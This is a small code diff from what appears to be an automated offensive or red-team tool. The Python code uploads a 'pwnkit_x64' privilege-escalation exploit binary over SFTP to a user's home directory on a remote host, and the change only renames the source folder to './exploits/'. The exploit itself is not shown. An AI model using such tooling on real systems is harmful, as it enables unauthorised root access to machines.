@@ -54,7 +54,7 @@ class UserIP:
 			sftp = ssh_client.open_sftp()
 			pwnkit_binary_name = "pwnkit_x64"
 			pwnkit_destination_path = f"/home/{username}/{pwnkit_binary_name}"
-			sftp.put(localpath=f"./binaries/{pwnkit_binary_name}", remotepath=pwnkit_destination_path, confirm=True)
+			sftp.put(localpath=f"./exploits/{pwnkit_binary_name}", remotepath=pwnkit_destination_path, confirm=True)
 			logger.info(f"Successfully copied {pwnkit_binary_name} binary over SSH.")
 			sftp.close()
 
